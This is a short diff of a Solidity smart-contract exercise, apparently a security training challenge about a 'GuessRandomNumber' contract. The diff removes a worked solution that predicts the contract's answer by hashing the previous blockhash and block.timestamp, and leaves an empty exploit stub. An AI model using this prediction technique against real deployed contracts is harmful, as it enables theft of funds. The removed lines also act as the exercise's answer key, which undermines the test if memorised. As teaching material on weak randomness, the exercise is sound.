@@ -32,22 +32,13 @@ contract GuessRandomNumber {
     }
 }
 
+//Write your exploit codes below
 contract ExploitContract {
     GuessRandomNumber public guessRandomNumber;
     uint8 public answer;
 
     function Exploit() public returns (uint8) {
-        // Put your exploit code here
-        answer = uint8(
-            uint256(
-                keccak256(
-                    abi.encodePacked(
-                        blockhash(block.number - 1),
-                        uint256(block.timestamp)
-                    )
-                )
-            )
-        );
+        
         return answer;
     }
 }
